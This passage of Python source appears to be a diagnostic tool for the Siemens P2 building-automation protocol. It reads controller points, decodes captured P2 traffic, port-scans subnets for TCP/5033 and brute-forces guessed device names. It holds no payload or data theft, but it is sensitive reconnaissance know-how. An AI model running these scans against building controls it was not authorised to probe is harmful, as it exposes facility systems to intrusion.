                    p += 3 + L
                    continue
            break  # TLV section ended

        if len(tlvs) < 3:
            return None

        try:
            program = tlvs[0][2].decode('ascii').rstrip()
            module = tlvs[1][2].decode('ascii').rstrip()
            code = tlvs[2][2].decode('ascii', errors='replace').rstrip()
        except UnicodeDecodeError:
            return None

        # Next 3 bytes after the 3 TLVs: next_line (u16 BE) + has_more (u8)
        tail_start = p
        if tail_start + 3 > len(body):
            return None
        next_line = struct.unpack('>H', body[tail_start:tail_start+2])[0]
        has_more = body[tail_start+2] == 0x01

        return {
            'program': program,
            'module': module,
            'code': code,
            'next_line': next_line,
            'has_more': has_more,
        }

    def browse_device(self, device: str, node_name: str = "node") -> Optional[Dict[str, Any]]:
        """
        Send a device browse request to enumerate device info.

        Args:
            device: TEC device name (e.g., "DEVICE1")
            node_name: P2 node name in lowercase

        Returns:
            Dict with device info, or None on failure.
        """
        seq = self._next_seq()
        routing = self._build_routing(node_name)

        dev_bytes = device.encode('ascii')

        browse_payload = (
            routing +
            b'\x42\x00' +
            b'\x01\x00\x04SYST' +
            b'\x23\x3f\xff\xff\xff' +
            b'\x00\x00' +
            b'\x01' + struct.pack('>H', len(dev_bytes)) + dev_bytes +
            b'\x00\x00\x01\x00\x00\xff\xff'
        )

        msg = P2Message(self.op_msg_type, seq, browse_payload)
        if not self._send_message(msg):
            return None

        resp = self._recv_response(seq)
        if resp is None:
            return None

        # Parse browse response for device description and metadata
        strings = self._extract_lp_strings(resp.payload)
        routing_names = {SCANNER_NAME, P2_NETWORK, P2_SITE} | {s.split('|')[0] for s in [SCANNER_NAME] if '|' in s}
        data_strs = [s for s in strings
                     if s.upper() not in {n.upper() for n in routing_names}
                     and not s.upper().startswith('NODE')]

        result = {'device': device, 'strings': data_strs}
        if len(data_strs) >= 2:
            result['description'] = data_strs[1]
        return result


# ═══════════════════════════════════════════════════════════════════════════════
# SCANNER OPERATIONS
# ═══════════════════════════════════════════════════════════════════════════════

def resolve_node_name(host: str) -> str:
    """Look up or auto-learn the P2 node name for a given IP address."""
    # Check known nodes first
    for name, ip in KNOWN_NODES.items():
        if ip == host:
            return name.lower()
    # Auto-probe the host to learn its name
    result = probe_p2_host(host)
    if result and 'node_name' in result:
        # Cache it for future use
        KNOWN_NODES[result['node_name']] = host
        return result['node_name'].lower()
    return "node"  # generic fallback


def scan_device(host: str, device: str, points: Optional[List[str]] = None,
                quick: bool = False, output_format: str = "table",
                force_slot: bool = False,
                inter_read_delay_s: float = 0.05) -> List[Dict]:
    """
    Scan all (or selected) points on a TEC device.

    Args:
        host: PXC controller IP address
        device: TEC device name
        points: Optional list of specific point names OR slot numbers (as
                strings like "29" or "DAY.NGT"). Numeric strings trigger
                slot → name resolution via the app's point table.
        quick: If True, only read key operational points
        output_format: "table", "json", or "csv"
        force_slot: When a numeric slot isn't defined in the app's point
                    table, normally the scanner refuses with a clear error.
                    Setting force_slot=True attempts the read anyway using
                    a synthesized name (useful for protocol troubleshooting).
        inter_read_delay_s: Seconds to wait between consecutive point reads
                    on the same device. Default 0.05. Sites with slow or
                    busy controllers can raise this (CLI: --read-delay).

    Returns:
        List of point result dicts
    """
    # Pre-flight validation: check slot-range inputs BEFORE we touch the network.
    # Doesn't catch "slot not defined in app" since we don't know the app yet,
    # but range violations are purely syntactic and can be rejected up front.
    if points:
        for p in points:
            p_str = str(p).strip()
            if p_str.isdigit():
                slot = int(p_str)
                if not (1 <= slot <= 99):
                    raise ScannerInputError(
                        f"Slot {slot} out of range — TEC subpoints are 1-99")

    node_name = resolve_node_name(host)
    # P2Connection needs the current (possibly auto-learned) network name
    conn = P2Connection(host, network=P2_NETWORK if P2_NETWORK else "P2NET",
                        scanner_name=SCANNER_NAME)

    # When output_format="none", we're running as a step inside a larger
    # sweep (e.g. building-wide room-temp read). Suppress per-device banners
    # and progress chatter so the sweep can render a single combined table.
    suppress_output = (output_format == "none")

    if not suppress_output:
        print(f"\n{'═' * 70}")
        print(f"  P2 SCANNER — {device} on {node_name.upper()} ({host})")
        if P2_NETWORK:
            print(f"  Network: {P2_NETWORK}  |  Site: {P2_SITE or '?'}")
        print(f"{'═' * 70}")

    if not conn.connect(node_name):
        return []

    # Determine which points to scan. When using the point table, we also
    # remember the app_num so we can attach rich metadata (type, labels,
    # scaling, etc.) to each read result — this drives pretty-printing and
    # gives downstream callers the context they need.
    scan_app_num = None
    if points or quick:
        # Explicit point list or quick mode — still read APPLICATION so we
        # can (a) render labels on the output, and (b) resolve numeric slots
        # against the app's point table.
        try:
            app_result = conn.read_point(device, "APPLICATION", node_name)
            if app_result and app_result.get('value') is not None:
                scan_app_num = int(app_result['value'])
        except Exception:
            pass  # app lookup is a nice-to-have, don't fail the scan over it

        if quick:
            scan_list = list(QUICK_SCAN_POINTS)
        else:
            # User gave explicit points. Each entry can be either a name
            # ('ROOM TEMP') or a slot number ('29'). Resolve numbers here
            # BEFORE hitting the wire so we can error cleanly on undefined
            # slots rather than sending garbage to the PXC.
            scan_list = []
            for p in points:
                p_stripped = str(p).strip()
                if p_stripped.isdigit():
                    slot = int(p_stripped)
                    if not (1 <= slot <= 99):
                        conn.close()
                        raise ScannerInputError(
                            f"Slot {slot} out of range — TEC subpoints are 1-99")
                    if scan_app_num is None:
                        conn.close()
                        raise ScannerInputError(
                            f"Can't resolve slot {slot} — failed to read "
                            f"APPLICATION from {device}. Try a named point first, "
                            f"or pass force_slot=True to attempt the read anyway.")
                    resolved = resolve_slot_to_name(scan_app_num, slot)
                    if resolved:
                        print(f"  Slot {slot} on app {scan_app_num} = {resolved!r}")
                        scan_list.append(resolved)
                    elif force_slot:
                        # Forced read of undefined slot. The PXC probably
                        # won't return anything useful, but this is a
                        # protocol-troubleshooting escape hatch.
                        synth = f"POINT_{slot}"
                        print(f"  [WARN] Slot {slot} not defined in app {scan_app_num} — "
                              f"forcing read as {synth!r} (likely to fail)")
                        scan_list.append(synth)
                    else:
                        conn.close()
                        raise ScannerInputError(
                            f"Slot {slot} is not defined in app {scan_app_num}. "
                            f"Use --force-slot (CLI) or force_slot=True (library) "
                            f"to try anyway.")
                else:
                    scan_list.append(p_stripped)
    else:
        # First, read APPLICATION to get the right point table
        print(f"  Reading APPLICATION number...")
        app_result = conn.read_point(device, "APPLICATION", node_name)
        app_num = None
        if app_result and app_result.get('value') is not None:
            app_num = int(app_result['value'])
            comm = app_result.get('comm_status', 'online')
            if comm == 'comm_fault':
                print(f"  ⚠ Device has #COM — values will be stale cached data")
            print(f"  Application: {app_num}")
        scan_app_num = app_num

        pt_table = get_point_table(app_num) if app_num else {}

        if pt_table:
            # Use the point table for this application
            scan_list = [info[0] for addr, info in sorted(pt_table.items())]
            print(f"  Scanning {len(scan_list)} points for app {app_num}")
        else:
            # No point table at all — try ALL known point names as last resort
            all_names = set()
            for app in range(2020, 2028):
                for addr, info in get_point_table(app).items():
                    all_names.add(info[0])
            scan_list = sorted(all_names)
            print(f"  No point table for app {app_num} — trying {len(scan_list)} common names")

    # F-4: warn (don't block) when the device's application is a BACnet/MSTP
    # transport — those are TEC devices that talk BACnet to the panel, not P2
    # FLN bus protocol. Reads via P2 wire opcodes will return 0x0003 not_found
    # or similar errors. The catalog flags this via `_meta.transport`. We
    # surface the warning but still attempt the scan (the scanner is read-only;
    # the failed reads are diagnostic rather than destructive).
    if scan_app_num is not None and app_supports_p2(scan_app_num) is False:
        meta = get_app_meta(scan_app_num) or {}
        print(f"  ⚠ App {scan_app_num} ({meta.get('descr', 'unknown')}) is a "
              f"BACnet/MSTP transport — P2 reads will likely fail. This device "
              f"should be reached via BACnet/IP if the panel acts as a router.")

    results = []
    total = len(scan_list)
    success = 0
    failed = 0

    for i, pt_name in enumerate(scan_list):
        if not suppress_output:
            sys.stdout.write(f"\r  Scanning: {i+1}/{total} — {pt_name:<25s}")
            sys.stdout.flush()

        result = conn.read_point(device, pt_name, node_name)
        if result and result['value'] is not None:
            result['point_name'] = pt_name
            # Attach rich metadata if we have the app number. This lets the
            # output formatters show "NIGHT" instead of "1.0" for digital
            # points, correct units even when the wire response lacks them,
            # etc.
            if scan_app_num is not None:
                info = get_point_info(scan_app_num, pt_name)
                if info:
                    result['point_info'] = info
                    # Fill in units if parser didn't get them from the wire
                    if not result.get('units') and info.get('units'):
                        result['units'] = info['units']
                    # Compute a rendered value_text for digital points
                    if 'on_label' in info and 'off_label' in info:
                        val = result['value']
                        result['value_text'] = info['on_label'] if val >= 0.5 else info['off_label']
                    result['point_type'] = info.get('type', 'unknown')
                # Panel-level points are not in the TEC library. Fall back
                # to the compiled-in tables: a point type implies a default
                # enumeration (the enum whose id is the negation of the type
                # code), so a digital point renders as OFF/ON rather than
                # 0.0/1.0 even with no application number to look up.
                if not result.get('value_text'):
                    txt = p2_data.resolve_state_text(
                        result.get('value'),
                        point_type=result.get('point_type_code'),
                        enum_id=result.get('enum_id'))
                    if txt:
                        result['value_text'] = txt
                if not result.get('point_type'):
                    mn = p2_data.point_type_name(result.get('point_type_code'))
                    if mn:
                        result['point_type'] = mn
                # Attach the subpoint slot number for Desigo-style '(29)'
                # display. Handled even when point_info is missing, in case
                # someone's scanning with only the legacy JSON.
                slot = get_point_slot(scan_app_num, pt_name)
                if slot is not None:
                    result['point_slot'] = slot
            results.append(result)
            success += 1
        else:
            failed += 1

        # Small delay to avoid overwhelming the controller
        if inter_read_delay_s > 0:
            time.sleep(inter_read_delay_s)

    conn.close()
    if not suppress_output:
        print(f"\r  Scan complete: {success} points read, {failed} failed{'':30s}")

        # Output results
        if output_format == "table":
            print_results_table(device, results)
        elif output_format == "json":
            print(json.dumps(results, indent=2))
        elif output_format == "csv":
            print_results_csv(results)

    return results


def scan_network(quick: bool = False) -> Dict[str, List[Dict]]:
    """Scan all known PXC nodes on the P2 network."""
    print(f"\n{'═' * 70}")
    print(f"  P2 NETWORK SCAN — {P2_NETWORK}")
    print(f"  {len(KNOWN_NODES)} known nodes")
    print(f"{'═' * 70}")

    all_results = {}
    for name, ip in sorted(KNOWN_NODES.items()):
        node_name = name.lower()
        conn = P2Connection(ip)

        print(f"\n  Probing {name} ({ip})...", end=" ")
        if conn.connect(node_name):
            print("CONNECTED")
            # Try reading a common point to verify the node is responsive
            result = conn.read_point("OATEMP", "OATEMP", node_name)
            if result:
                print(f"    OATEMP = {result['value']}")
            conn.close()
            all_results[name] = [result] if result else []
        else:
            print("FAILED")
            all_results[name] = []

    return all_results


# ═══════════════════════════════════════════════════════════════════════════════
# PASSIVE SNIFFER (PCAP ANALYSIS)
# ═══════════════════════════════════════════════════════════════════════════════

def sniff_pcap(pcap_file: str, output_format: str = "table") -> List[Dict]:
    """
    Parse a pcap/pcapng file and decode all P2 point data from both 5033 and 5034.
    Surfaces:
      - Point reads and COV notifications (0x0274) — as list of events
      - BLN routing-table topology (0x4634) — printed as summary
      - Unique panel list derived from routing headers
    Requires tshark to be installed.
    """
    import subprocess

    print(f"\n{'═' * 70}")
    print(f"  P2 PCAP DECODER — {pcap_file}")
    print(f"{'═' * 70}")

    # Use tcp.payload, not data.data. The `data.data` field is only populated
    # when Wireshark fails to classify TCP data with any protocol — and on
    # systems where the p2.lua dissector is loaded (or any other handler
    # claims TCP/5033) it stays empty. tcp.payload is the raw bytes after
    # the TCP header, always populated, regardless of dissector chain.
    result = subprocess.run([
        'tshark', '-r', pcap_file,
        '-Y', '(tcp.port==5033 || tcp.port==5034) && tcp.payload',
        '-T', 'fields',
        '-e', 'frame.number', '-e', 'ip.src', '-e', 'ip.dst',
        '-e', 'tcp.srcport', '-e', 'tcp.dstport',
        '-e', 'tcp.payload'
    ], capture_output=True, text=True)

    if result.returncode != 0:
        print(f"  [ERROR] tshark failed: {result.stderr}")
        return []

    ip_node = {}
    all_points = []
    # Cross-panel topology observations — populated from 0x4634 routing tables
    routing_tables = []  # [{'src_panel': ..., 'peers': [{'name': ..., 'cost': ...}]}]
    cov_sources: 'Counter[str]' = Counter()

    def _inc(d, k):
        d[k] += 1

    for line in result.stdout.strip().split('\n'):
        parts = line.split('\t')
        if len(parts) < 6:
            continue

        fnum, src, dst = int(parts[0]), parts[1], parts[2]
        try:
            sport, dport = int(parts[3]), int(parts[4])
        except ValueError:
            continue
        port_on_wire = 5033 if (dport == 5033 or sport == 5033) else 5034
        try:
            raw = bytes.fromhex(parts[5])
        except Exception:
            continue

        # Parse potentially multiple P2 messages in one TCP segment
        pos = 0
        while pos < len(raw) - 12:
            remaining = len(raw) - pos
            if remaining < 12:
                break
            total_len = struct.unpack('>I', raw[pos:pos+4])[0]
            # Malformed frame (length under 12 = invalid; over remaining =
            # truncated/forged). Stop parsing this segment rather than
            # consuming whatever's left as one giant fake frame — that would
            # corrupt subsequent iteration state and could panic the parser.
            if total_len < 12 or total_len > remaining:
                break
            msg = raw[pos:pos+total_len]
            pos += total_len

            if len(msg) <= 12:
                continue

            resp_flag = msg[12]

            # Map node names from routing headers
            lp = P2Connection._extract_lp_strings(msg[12:])
            routing_set = {P2_NETWORK, SCANNER_NAME, P2_SITE} | {s.split('|')[0] for s in [SCANNER_NAME] if '|' in s}
            for s in lp:
                if s.upper().startswith('NODE') and s.upper() not in routing_set:
                    remote_ip = dst if src != dst else src
                    ip_node[remote_ip] = s.upper()

            # ── 0x4634 routing-table push: extract BLN topology
            rt_idx = msg.find(b'\x46\x34')
            if rt_idx >= 14 and rt_idx < len(msg) - 20:
                # Only process if it looks like a real routing-table body (not inside a float)
                # Heuristic: preceded by end-of-routing-header null terminator within a few bytes
                if b'\x00' in msg[max(12, rt_idx-2):rt_idx]:
                    body = msg[rt_idx:]
                    parsed = parse_routing_table(body)
                    if parsed and parsed.get('entries'):
                        src_panel = '?'
                        # The source panel for a PXC->DCC routing push is in routing slot 4
                        rh = _parse_routing_header(msg[12:])
                        if rh:
                            _, names, _ = rh
                            src_panel = names[3] if len(names) >= 4 else '?'
                        routing_tables.append({
                            'src_panel': src_panel,
                            'port': port_on_wire,
                            'frame': fnum,
                            'entries': parsed['entries'],
                        })

            # ── 0x0274 COV / value-push
            marker_idx = msg.find(b'\x02\x74')
            if marker_idx >= 0:
                after = msg[marker_idx + 2:]
                if len(after) >= 7 and after[0:6] == b'\x00\x01\x00\x00\x01\x00':
                    name_len = after[6]
                    if name_len > 0 and len(after) >= 7 + name_len + 7:
                        try:
                            pt_name = after[7:7+name_len].decode('ascii')
                        except Exception:
                            pt_name = None
                        if pt_name and pt_name.isprintable():
                            val_area = after[7+name_len:]
                            value = None
                            # Two value-block shapes: (a) immediate TLV marker with f32,
                            # (b) second TLV string (device first) then f32 — PXC->DCC form.
                            if len(val_area) >= 7 and val_area[0:3] == b'\x01\x00\x00':
                                try:
                                    value = struct.unpack('>f', val_area[3:7])[0]
                                except struct.error:
                                    pass
                            elif len(val_area) >= 3 and val_area[0] == 0x01:
                                # Skip the second TLV string, then read f32
                                L2 = struct.unpack('>H', val_area[1:3])[0]
                                if 3 + L2 + 4 <= len(val_area):
                                    try:
                                        value = struct.unpack('>f', val_area[3+L2:3+L2+4])[0]
                                    except struct.error:
                                        pass

                            remote_ip = dst if src != dst else src
                            node = ip_node.get(remote_ip, remote_ip)
                            # A 0x0274 ValuePush is a panel->supervisor COV or a
                            # supervisor->panel virtual write; the protocol does NOT
                            # tie that distinction to a port number. In a passive
                            # capture we infer it from the listener port in play:
                            # only the supervisor runs a second (push) listener, so a
                            # frame on a non-canonical port is a panel->supervisor
                            # COV, while 5033 frames default to a virtual write. This
                            # is a heuristic, not a protocol rule — the opcode is
                            # identical on any port.
                            direction = 'pxc_to_dcc' if port_on_wire != 5033 else 'dcc_to_pxc'
                            all_points.append({
                                'frame': fnum,
                                'node': node,
                                'point_name': pt_name,
                                'value': value,
                                'type': 'COV_PUSH' if direction == 'pxc_to_dcc' else 'VIRTUAL_WRITE',
                                'direction': direction,
                            })
                            _inc(cov_sources, node)

            # ── Read responses (flag=1, has 3FFFFFxx value-block signature)
            if resp_flag == 1:
                flags_idx = -1
                for i in range(12, len(msg) - 3):
                    if msg[i] == 0x3F and msg[i+1] == 0xFF and msg[i+2] == 0xFF:
                        flags_idx = i
                        break
                if flags_idx >= 0:
                    pre = msg[12:flags_idx]
                    data_strs = [s for s in P2Connection._extract_lp_strings(pre)
                                 if s not in routing_set and not s.upper().startswith('NODE')]
                    after_flags = msg[flags_idx + 3:]
                    if len(after_flags) >= 8 and len(data_strs) >= 2:
                        raw_val = after_flags[4:8]
                        try:
                            value = struct.unpack('>f', raw_val)[0]
                        except struct.error:
                            value = None
                        # Extract units
                        units = ''
                        for s in P2Connection._extract_lp_strings(after_flags[8:]):
                            if s in ('DEG F', 'PCT', 'SEC', 'CFM', 'PSI'):
                                units = s
                                break

                        remote_ip = dst if src != dst else src
                        node = ip_node.get(remote_ip, remote_ip)
                        all_points.append({
                            'frame': fnum,
                            'node': node,
                            'device_name': data_strs[0],
                            'point_name': data_strs[1],
                            'value': value,
                            'units': units,
                            'description': data_strs[2] if len(data_strs) >= 3 else '',
                            'type': 'READ',
                        })

    print(f"  Decoded {len(all_points)} point values")

    # ── Topology summary from observed 0x4634 messages
    if routing_tables:
        # Merge all observed routing tables into a single unique peer list
        all_peers = {}
        for rt in routing_tables:
            for entry in rt['entries']:
                n = entry['name']
                if n and n not in all_peers:
                    all_peers[n] = entry['cost']
        print(f"\n  ── BLN topology (from {len(routing_tables)} routing-table pushes) ──")
        print(f"  {'Peer':<24} {'Cost':>8}")
        for name, cost in sorted(all_peers.items()):
            print(f"  {name:<24} {cost:>8}")

    if cov_sources:
        # Sort — works for Counter.most_common() or plain dict fallback
        try:
            top = cov_sources.most_common(10)
        except AttributeError:
            top = sorted(cov_sources.items(), key=lambda kv: -kv[1])[:10]
        if top:
            print(f"\n  ── COV / value pushes by source node ──")
            for node, n in top:
                print(f"  {node:<24} {n:>6} events")

    if output_format == "table" and all_points:
        # Group by node and device
        from itertools import groupby
        keyfunc = lambda p: (p.get('node', '?'), p.get('device_name', p.get('point_name', '?')))
        sorted_pts = sorted(all_points, key=keyfunc)
        for key, group in groupby(sorted_pts, key=keyfunc):
            pts = list(group)
            print(f"\n  {key[0]} / {key[1]}:")
            seen = set()
            for p in pts:
                pt_key = p['point_name']
                if pt_key in seen:
                    continue
                seen.add(pt_key)
                val = p['value']
                units = p.get('units', '')
                if val is not None:
                    print(f"    {pt_key:<30s} = {val:>10.2f} {units}")

    return all_points


# ═══════════════════════════════════════════════════════════════════════════════
# OUTPUT FORMATTING
# ═══════════════════════════════════════════════════════════════════════════════

def print_results_table(device: str, results: List[Dict]):
    """Print point results in a formatted table."""
    if not results:
        print("  No results.")
        return

    # Check if device is genuinely offline vs just a few unconnected inputs
    comm_fault_count = sum(1 for r in results if r.get('comm_status') == 'comm_fault')
    total_with_status = sum(1 for r in results if r.get('comm_status'))

    if total_with_status > 0 and comm_fault_count == total_with_status:
        print(f"\n  ⚠ WARNING: Device {device} has #COM (communication fault)")
        print(f"  Values shown are STALE cached data — device is offline!")
    elif comm_fault_count > total_with_status * 0.5:
        print(f"\n  ⚠ WARNING: {comm_fault_count}/{total_with_status} points show #COM")
        print(f"  Device may be offline — some values could be stale")
    elif comm_fault_count > 0:
        print(f"\n  Note: {comm_fault_count} point(s) show #COM (unconnected inputs)")

    # Column widths: Point column holds "(##) POINT_NAME_WITH_SPACES". With
    # slot numbers up to 99 that's "(##) " = 5 chars of prefix + up to 25
    # chars of name = 30. Digital labels ("NIGHT"/"COOL"/"OFF") fit in the
    # Value column without truncation while numeric values stay clean.
    print(f"\n  {'Point':<31s} {'Value':>14s} {'Units':<8s} {'Type':<12s}")
    print(f"  {'─' * 31} {'─' * 14} {'─' * 8} {'─' * 12}")

    for r in results:
        val = r.get('value')
        units = r.get('units', '')
        name = r.get('point_name', '?')
        slot = r.get('point_slot')
        comm = r.get('comm_status', '')
        info = r.get('point_info')

        # Desigo-style '(29) DAY.NGT' prefix when slot is known
        if slot is not None:
            name_display = f"({slot}) {name}"
        else:
            name_display = name

        # Type column: prefer rich 'point_type' over raw 'data_type'
        type_display = r.get('point_type') or r.get('data_type', '') or ''
        type_short = {
            'analog_ro':  'AI',
            'analog_rw':  'AO',
            'digital_ro': 'BI',
            'digital_rw': 'BO',
        }.get(type_display, type_display)

        if val is not None:
            if r.get('value_text'):
                label = r['value_text']
                raw_int = int(round(val))
                val_str = f"{label} ({raw_int})"
            else:
                if val == int(val) and abs(val) < 100000:
                    val_str = f"{int(val)}"
                else:
                    val_str = f"{val:.2f}"
            if comm == 'comm_fault':
                val_str += " #COM"
        else:
            val_str = "—"

        print(f"  {name_display:<31s} {val_str:>14s} {units:<8s} {type_short:<12s}")


def print_results_csv(results: List[Dict]):
    """Print results in CSV format."""
    writer = csv.writer(sys.stdout)
    writer.writerow(['point_slot', 'point_name', 'value', 'value_text', 'units',
                     'point_type', 'data_type', 'comm_status', 'description'])
    for r in results:
        writer.writerow([
            r.get('point_slot', ''),
            r.get('point_name', ''),
            r.get('value', ''),
            r.get('value_text', ''),
            r.get('units', ''),
            r.get('point_type', ''),
            r.get('data_type', ''),
            r.get('comm_status', ''),
            r.get('description', ''),
        ])


def _print_sweep_results(sweep_results: List[Dict], read_points: List,
                         output_format: str = "table"):
    """Render building-wide sweep output — results are flat, one row per
    (node, device, point). Prints a single combined table/CSV/JSON.
    Each result dict has '_node' and '_device' set from discover_network."""
    if not sweep_results:
        print("  No devices responded.")
        return

    if output_format == "json":
        # JSON: pass through as-is for programmatic use
        print(json.dumps(sweep_results, indent=2, default=str))
        return

    if output_format == "csv":
        writer = csv.writer(sys.stdout)
        writer.writerow(['node', 'device', 'description', 'point_slot',
                         'point_name', 'value', 'value_text', 'units',
                         'point_type', 'comm_status', 'error'])
        for r in sweep_results:
            writer.writerow([
                r.get('_node', r.get('node', '')),
                r.get('_device', r.get('device', '')),
                r.get('_description', r.get('description', '')),
                r.get('point_slot', ''),
                r.get('point_name', ''),
                r.get('value', ''),
                r.get('value_text', ''),
                r.get('units', ''),
                r.get('point_type', ''),
                r.get('comm_status', ''),
                r.get('error', ''),
            ])
        return

    # Table: grouped by node, then device
    print(f"\n  {'Node':<8s} {'Device':<12s} {'Point':<22s} {'Value':>14s} {'Units':<8s}")
    print(f"  {'─' * 8} {'─' * 12} {'─' * 22} {'─' * 14} {'─' * 8}")

    prev_node = None
    for r in sweep_results:
        node = r.get('_node', r.get('node', '?'))
        dev = r.get('_device', r.get('device', '?'))

        # Insert blank line between nodes for readability
        if prev_node and node != prev_node:
            print()
        prev_node = node

        if 'error' in r:
            print(f"  {node:<8s} {dev:<12s} {'(' + r['error'] + ')':<22s} "
                  f"{'—':>14s} {'':<8s}")
            continue

        name = r.get('point_name', '?')
        slot = r.get('point_slot')
        if slot is not None:
            name_display = f"({slot}) {name}"
        else:
            name_display = name

        # Clip for width
        if len(name_display) > 22:
            name_display = name_display[:21] + "…"

        val = r.get('value')
        units = r.get('units', '') or ''

        if val is None:
            val_str = "—"
        elif r.get('value_text'):
            val_str = f"{r['value_text']} ({int(round(val))})"
        elif val == int(val) and abs(val) < 100000:
            val_str = f"{int(val)}"
        else:
            val_str = f"{val:.2f}"

        if r.get('comm_status') == 'comm_fault':
            val_str += " #COM"

        print(f"  {node:<8s} {dev:<12s} {name_display:<22s} {val_str:>14s} {units:<8s}")


# ═══════════════════════════════════════════════════════════════════════════════
# NETWORK DISCOVERY
# ═══════════════════════════════════════════════════════════════════════════════

# Common TEC device name patterns to try during brute-force discovery.
# This is a generic starter set covering naming conventions seen broadly
# across commercial BAS installations. It is deliberately conservative;
# many sites use site-specific prefixes (e.g. perimeter-VAV series, suite
# numbering, tenant-prefixed devices) that the integrator established at
# commissioning time. Edit this list to add your site's naming conventions
# for faster discovery — the more accurate the seed list, the faster cold
# discovery converges.
DISCOVERY_DEVICE_PATTERNS = [
    # AC/AH series (AHUs) — common Siemens factory naming
    *[f"AC{n:02d}" for n in range(1, 20)],
    *[f"AH{n:02d}" for n in range(1, 20)],
    *[f"AH{n:02d}T1" for n in range(1, 20)],
    *[f"AC{n:02d}T1" for n in range(1, 20)],
    # BLR series — generic boiler patterns
    *[f"BLR{n}" for n in range(1, 6)],
    "BLRST", "BLRSTPT",                    # boiler status / setpoint (generic)
    # Add site-specific abbreviations here as you encounter them. Common
    # patterns to watch for: interior-VAV prefixes, perimeter-zone series,
    # custom boiler-plant abbreviations (valve outputs, OA-enable flags),
    # tenant-prefixed devices.
    # Exhaust / supply fans
    *[f"EF{n}" for n in range(1, 25)],
    *[f"SF{n}" for n in range(1, 10)],
    *[f"EF{n:02d}" for n in range(1, 25)],
    # Common generic points
    "OATEMP", "OAT",
    # Floor-based naming patterns
    *[f"FLR{n}VAV{v}" for n in range(1, 16) for v in range(1, 6)],
    # Common VAV naming: V followed by numbers
    *[f"V{n}" for n in range(1, 51)],
    *[f"VAV{n}" for n in range(1, 51)],
    *[f"VAV-{n}" for n in range(1, 21)],
    # Zone controllers
    *[f"ZN{n}" for n in range(1, 31)],
    *[f"ZONE{n}" for n in range(1, 21)],
    # Room-based naming (generic step-100 series)
    *[f"RM{n}" for n in range(100, 500, 100)],
    # Suite-based
    *[f"STE{n}" for n in range(100, 500, 100)],
    *[f"SUITE{n}" for n in range(1, 21)],
    # Heat pump / FCU
    *[f"HP{n}" for n in range(1, 21)],
    *[f"FCU{n}" for n in range(1, 21)],
    *[f"FCU-{n}" for n in range(1, 21)],
    # CW/HW/CHW
    *[f"CWP{n}" for n in range(1, 6)],
    *[f"HWP{n}" for n in range(1, 6)],
    *[f"CHWP{n}" for n in range(1, 6)],
    # Misc
    *[f"UH{n}" for n in range(1, 11)],  # Unit heaters
    *[f"RTU{n}" for n in range(1, 11)],  # Rooftop units
    *[f"MAU{n}" for n in range(1, 6)],   # Makeup air
    *[f"CT{n}" for n in range(1, 6)],    # Cooling towers
    *[f"CH{n}" for n in range(1, 6)],    # Chillers
    *[f"P{n}" for n in range(1, 11)],    # Pumps
]

# Panel-level point names (not TECs, but readable from nodes).
# Conservative starter set covering Siemens factory defaults and broadly-
# common BAS conventions. Many panels expose site-specific custom points
# (zone-prefixed, tenant-prefixed, integrator-specific PPCL globals, lighting
# schedules) that vary per deployment. Missing point names are harmless —
# the scanner just gets no data for them. Edit this list to add the custom
# panel points used at your site for richer panel-level discovery results.
PANEL_POINT_NAMES = [
    # Outside air / weather (common Siemens-default naming)
    "OATEMP", "OAT", "OUTSIDE_AIR_TEMP",
    # Boiler common patterns (BLR{n} alarm/enable/status)
    "BLRST", "BLRSTPT",
    *[f"BLR{n}ALM" for n in range(1, 5)],
    *[f"BLR{n}ENB" for n in range(1, 5)],
    *[f"BLR{n}ST"  for n in range(1, 5)],
    # Chiller common patterns
    *[f"CH{n}ALM"  for n in range(1, 5)],
    *[f"CH{n}ENB"  for n in range(1, 5)],
    *[f"CH{n}ST"   for n in range(1, 5)],
    # Exhaust fan enables / statuses
    *[f"EF{n}_ENABLE" for n in range(1, 21)],
    *[f"EF{n}_STATUS" for n in range(1, 21)],
    *[f"EF{n}.ENABLE" for n in range(1, 21)],
    # Add site-specific panel-internal points here. Common shapes to watch
    # for: legacy/replacement weather-feed mirrors, site-aggregated enthalpy,
    # system-mode globals (heat-lockout / cool-release style), chilled-water
    # differential-pressure points, tenant-prefixed lighting schedules.
    # The .BN suffix indicates BLN-virtual (mirrored from another panel).
]


def parse_ip_range(range_str: str) -> List[str]:
    """
    Parse flexible IP range formats into a list of IPs.

    Supported formats:
        192.0.2.50              Single IP
        192.0.2.1-254            Last octet range
        192.0.2.0/24             CIDR notation
        192.0.2                 Shorthand for .1-.254
        192.0.2.0/24,198.51.100.0/24   Comma-separated multiple ranges
    """
    ips = []
    for part in range_str.split(','):
        part = part.strip()

        if '/' in part:
            # CIDR notation
            base, prefix_len = part.split('/')
            prefix_len = int(prefix_len)
            octets = [int(o) for o in base.split('.')]
            if prefix_len == 24:
                for i in range(1, 255):
                    ips.append(f"{octets[0]}.{octets[1]}.{octets[2]}.{i}")
            elif prefix_len == 16:
                for s3 in range(0, 256):
                    for s4 in range(1, 255):
                        ips.append(f"{octets[0]}.{octets[1]}.{s3}.{s4}")
            else:
                # Just do /24 from the base
                for i in range(1, 255):
                    ips.append(f"{octets[0]}.{octets[1]}.{octets[2]}.{i}")

        elif '-' in part.split('.')[-1]:
            # Range in last octet: 192.0.2.1-254
            base = '.'.join(part.split('.')[:-1])
            range_part = part.split('.')[-1]
            start, end = range_part.split('-')
            for i in range(int(start), int(end) + 1):
                ips.append(f"{base}.{i}")

        elif part.count('.') == 2:
            # Shorthand subnet: 192.0.2 → 192.0.2.1-254
            for i in range(1, 255):
                ips.append(f"{part}.{i}")

        elif part.count('.') == 3:
            # Single IP
            ips.append(part)

    return ips


def port_scan_p2(ip_list: List[str], timeout: float = 0.5) -> List[str]:
    """Scan a list of IPs for TCP/5033 open."""
    found = []
    total = len(ip_list)

    for i, ip in enumerate(ip_list):
        sys.stdout.write(f"\r  Scanning {ip} ({i+1}/{total})...   ")
        sys.stdout.flush()

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            result = s.connect_ex((ip, P2_PORT))
            s.close()
            if result == 0:
                found.append(ip)
                sys.stdout.write(f"\r  {ip} — P2 OPEN                    \n")
                sys.stdout.flush()
        except Exception:
            pass

    sys.stdout.write(f"\r  Scan complete: {len(found)} P2 hosts found{'':30s}\n")
    return found


def learn_network_name(hosts: List[str]) -> Optional[str]:
    """
    Try to auto-learn the P2 network name.
    Strategy 1: If P2_NETWORK is already set, return it.
    Strategy 2: Try a live tshark capture to sniff P2 traffic.
    Strategy 3: PXCs won't respond without the name, so prompt user.
    """
    if P2_NETWORK:
        return P2_NETWORK

    # Try live capture with tshark
